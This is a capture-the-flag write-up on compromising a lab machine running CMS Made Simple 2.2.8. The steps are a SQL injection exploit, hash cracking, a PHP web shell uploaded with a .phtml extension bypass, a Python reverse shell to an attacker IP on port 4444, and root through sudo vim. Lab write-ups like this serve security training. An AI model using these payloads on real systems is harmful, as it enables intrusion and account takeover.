# Simple CTF Write-up

A beginner-friendly CTF machine focused on **web enumeration, SQL injection exploitation, hash cracking, and credential discovery** through vulnerabilities in **CMS Made Simple**.

---

# Target Information

## Target Machine IP

```
10.129.165.68
```

---

# Connectivity Check

Before starting enumeration, I verified that the target machine was reachable.

```
ping 10.129.165.68
```

The machine responded successfully, confirming that the target host was **online and reachable**.

---

# Port Scanning

I performed a service scan using **Nmap** to discover open ports and running services.

```
nmap -sV 10.129.165.68
```

### Result

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

### Findings

Three open ports were discovered:

|Port|Service|
|---|---|
|21|FTP|
|80|HTTP|
|2222|SSH|

Since a **web server was running on port 80**, the next step was **web enumeration**.

---

# Web Enumeration

Opening the website in a browser displayed the following page:

```
Apache2 Ubuntu Default Page
```

This suggested that the web server was running **Apache on Ubuntu**, but no application was immediately visible.

Therefore, further **directory enumeration** was required.

---

# Directory Enumeration

To discover hidden directories, I used **ffuf** with the `common.txt` wordlist from SecLists.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.165.68/FUZZ
```

### Result

```
.hta
.htpasswd
.htaccess
index.html
server-status
simple
robots.txt
```

### Interesting Discovery

The most interesting discovery was the directory:

```
/simple
```

---

# CMS Discovery

Navigating to the `/simple` directory revealed that the website was running:

```
CMS Made Simple version 2.2.8
```

Since the **exact version was disclosed**, I searched online for known vulnerabilities affecting this version.

---

# Vulnerability Research

While researching **CMS Made Simple 2.2.8**, I discovered that versions:

```
CMS Made Simple < 2.2.10
```

are vulnerable to **SQL Injection**.

Exploit reference:

[https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635)

This exploit allows attackers to **extract administrator credentials from the database**.

---

# Exploit Preparation

I copied the exploit code locally into a file named:

```
exploit.py
```

However, the exploit was originally written for **Python 2**, so I modified the syntax to make it compatible with **Python 3**.

### Example Modification

Old Python 2 syntax:

```
print ""
```

Updated Python 3 syntax:

```
print("")
```

---

# Exploitation

I executed the exploit against the vulnerable CMS installation.

```
python3 exploit.py -u http://10.129.165.68/simple/
```

### Result

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@ad6t7qt5285
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

The exploit successfully extracted:

- Username
    
- Email
    
- Password hash
    
- Salt value
    

---

# Password Cracking

The exploit returned a **hashed password and salt**, which needed to be cracked.

The hash and salt were stored in a file:

```
hash.txt
```

### Hash Format

```
0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2
```

To crack the password, I used **John the Ripper** with a common password wordlist.

```
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/best110.txt --format=dynamic='md5($s.$p)' hash.txt
```

After cracking, I displayed the result:

```
john --show --format=dynamic='md5($s.$p)' hash.txt
```

### Result

```
?:secret
```

The password was successfully cracked:

```
secret
```

---

# SSH Login Attempt (The SSH service was running on a non-standard port, which I initially overlooked)

Using the discovered credentials:

```
Username: mitch
Password: secret
```

I attempted to connect through SSH.

```
ssh mitch@10.129.165.68
```

### Result

```
ssh: connect to host 10.129.165.68 port 22: Connection timed out
```

The connection failed because **SSH was not running on port 22**.

From the Nmap scan earlier, SSH was actually running on:

```
2222
```

At this point, I continued further enumeration of the **CMS application**.

---

# Further Directory Enumeration

To find a possible login page within the CMS installation, I ran **ffuf again**, this time targeting the `/simple` directory.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.165.68/simple/FUZZ
```

### Result

```
admin
assets
doc
index.php
lib
modules
tmp
```

### Interesting Directory

The most interesting discovery was:

```
/simple/admin
```

This strongly suggested the presence of the **CMS administrator login panel**.

# Admin Panel Access

From the directory enumeration earlier, the following path was discovered:

```
/simple/admin
```

Accessing this directory redirected to a **CMS Made Simple administrator login page**.

Using the credentials obtained earlier:

```
Username: mitch
Password: secret
```

I successfully authenticated and gained access to the **CMS admin console**.

---

# File Upload Vulnerability

Inside the admin console, I discovered a **File Manager** feature that allowed uploading files to the server.

This suggested a possible **file upload vulnerability**, which could potentially lead to **remote command execution (RCE)**.

---

# Attempt 1: Uploading PHP Shell

I first attempted to upload a simple PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Saved as:

```
shell.php
```

However, the upload was **blocked by the application**, indicating that `.php` files were filtered.

---

# Attempt 2: Extension Bypass

To bypass the restriction, I tested alternative PHP extensions:

```
shell.php5
shell.php7
```

These attempts also **failed**, meaning the CMS likely blocked those extensions as well.

---

# Successful Upload: .phtml

Finally, I tried the extension:

```
shell.phtml
```

This extension was **successfully uploaded**, indicating that the application did not properly filter all executable PHP extensions.

---

# Remote Command Execution

After uploading the shell, I accessed it through the browser:

```
http://10.129.165.68/simple/uploads/Test/shell.phtml?cmd=whoami
```

### Output

```
www-data
```

This confirmed that **remote command execution was successful**, and commands were running under the **www-data** user.

---

# Reverse Shell

To obtain an interactive shell, I used a **Python reverse shell payload**.

```
http://10.129.165.68/simple/uploads/Test/shell.phtml?cmd=python%20-c%20%27import%20socket,os,pty;s=socket.socket();s.connect((%22192.168.128.91%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/bash%22)%27
```

Before executing the payload, I started a listener:

```
nc -lvnp 4444
```

Once triggered, the reverse shell connected back successfully.

---

# Upgrading the Shell

To improve shell usability, I upgraded the shell with:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

and then:

```
export TERM=xterm
```

This provided a **more stable interactive shell**.

---

# User Enumeration

I navigated to the `/home` directory:

```
cd /home
ls
```

Output:

```
mitch
sunbath
```

---

# Switching User

Since we already had the credentials for **mitch**, I switched users:

```
su mitch
```

Password:

```
secret
```

---

# User Flag

I navigated to Mitch's home directory:

```
cd /home/mitch
ls
```

Output:

```
user.txt
```

Reading the file:

```
cat user.txt
```

Output:

```
G00d j0b, keep up!
```

User flag successfully obtained.

---

# Privilege Escalation

Next, I checked the **sudo permissions** for the user.

```
sudo -l
```

### Output

```
User mitch may run the following commands on Machine:
(root) NOPASSWD: /usr/bin/vim
```

This means **mitch can run Vim as root without a password**.

This is a **known privilege escalation vector**.

---

# Exploiting Vim for Root Access

Using Vim, it is possible to spawn a shell.

```
sudo vim -c ':!/bin/sh'
```

After executing this command, a root shell was obtained.

---

# Root Access

Verifying privileges:

```
whoami
```

Output:

```
root
```

---

# Root Flag

Navigating to the root directory:

```
cd /root
ls
```

Output:

```
root.txt
```

Reading the flag:

```
cat root.txt
```

Output:

```
W3ll d0n3. You made it!
```

Root flag successfully captured.

---

# Alternative Privilege Escalation (Pkexec)

Another possible method to obtain root access directly from **www-data** is exploiting the **Pkexec vulnerability (CVE-2021-4034)**.

This vulnerability allows **local privilege escalation** on vulnerable Linux systems.

Reference implementation:

[https://github.com/lekssayshamza/tryhackme-writeups/blob/master/Ignite/README.md](https://github.com/lekssayshamza/tryhackme-writeups/blob/master/Ignite/README.md)

---

# Attack Path Summary

1. **Nmap Scan**
    
    - Discovered FTP, HTTP, and SSH services.
        
2. **Directory Enumeration**
    
    - Found `/simple` directory.
        
3. **CMS Identification**
    
    - CMS Made Simple **2.2.8**.
        
4. **Exploit**
    
    - SQL injection vulnerability extracted credentials.
        
5. **Password Cracking**
    
    - Cracked hash → `secret`.
        
6. **Admin Panel Access**
    
    - Logged into CMS admin dashboard.
        
7. **File Upload Vulnerability**
    
    - Uploaded `.phtml` web shell.
        
8. **Remote Code Execution**
    
    - Executed commands via web shell.
        
9. **Reverse Shell**
    
    - Obtained shell as `www-data`.
        
10. **User Access**
    
    - Switched to `mitch`.
        
11. **Privilege Escalation**
    
    - Exploited `sudo vim`.
        
12. **Root Access**
    
    - Retrieved root flag.